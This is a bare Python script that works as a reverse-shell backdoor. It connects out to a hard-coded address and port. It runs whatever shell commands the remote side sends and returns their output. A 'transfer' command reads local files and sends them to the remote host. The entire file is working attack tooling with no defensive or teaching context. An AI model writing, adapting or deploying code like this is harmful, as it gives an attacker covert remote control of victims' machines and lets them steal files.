#!/usr/bin/env python
 
import socket 
import subprocess 
import os 

IPAddr = "192.168.168.1"
Port = 8080

def transfer(s,path):
    if os.path.exists(path):
        with open(path, 'rb') as f:
            packet = f.read(1024)
            while len(packet) > 0:
                s.send(packet) 
                packet = f.read(1024)
            s.send('Transfer Completed'.encode())
        
    else: 
        s.send('Unable to locate the file')

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((IPAddr, Port))
 
    while True: 
        command = s.recv(1024).decode()
        
        if 'exit' in command:
            s.close()
            break

        elif 'cd ' in command:
            os.chdir(command[3:])

        elif 'transfer' in command: 
            path = command.split('&')[1]
            
            try: 
                transfer(s,path)
            except Exception as e:
                s.send(str(e).encode())
                pass

        else:
            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send(CMD.stdout.read()) 
            s.send(CMD.stderr.read()) 

connect()

